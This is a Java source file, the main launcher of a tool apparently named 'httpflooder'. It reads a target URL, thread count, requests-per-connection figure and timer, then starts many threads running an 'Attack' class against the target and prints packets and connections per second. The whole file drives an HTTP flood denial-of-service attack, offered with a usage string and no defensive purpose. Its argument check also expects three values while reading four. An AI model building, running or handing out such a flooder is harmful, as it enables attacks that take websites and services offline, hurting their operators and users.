package com.github.mhprodev.httpflooder;

import lombok.Getter;
import lombok.Setter;
import lombok.experimental.UtilityClass;

import java.net.MalformedURLException;
import java.net.URL;

@UtilityClass
public class Main {
    @Getter
    private int threads;
    @Getter
    private URL url;
    @Getter
    private int rpc;
    public int pps = 0;
    public int cps = 0;
    @Getter
    @Setter
    private boolean running = false;

    public void main(String[] args) {
        try {
            Validate.validArgs(args, 3, "java -jar script.jar <target> <threads> <rpc> <timer>");
            Validate.validClass(args[0], URL.class, "Invalid url");
            Validate.validClass(args[1], Integer.class, "Invalid threads integer");
            Validate.validClass(args[2], Integer.class, "Invalid connection pre seconds");
            Validate.validClass(args[3], Integer.class, "Invalid timer");

            url = new URL(args[0]);
            threads = Integer.parseInt(args[1]);
            rpc = Integer.parseInt(args[2]);
            int timer = Integer.parseInt(args[3]);

            for (int i = 0; i < threads; i++) {
                final Thread thread = new Thread(new Attack());
                thread.setDaemon(true);
                thread.start();
            }

            Main.setRunning(true);
            while (timer > 0) {
                timer -= 1;
                Thread.sleep(1000);
                System.out.printf("PPS: %d CPS: %d\n", Main.pps, Main.cps);
                Main.pps = 0;
                Main.cps = 0;
            }
            Main.setRunning(false);
        } catch (IllegalAccessException e) {
            System.out.println(e.getLocalizedMessage());
        } catch (MalformedURLException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}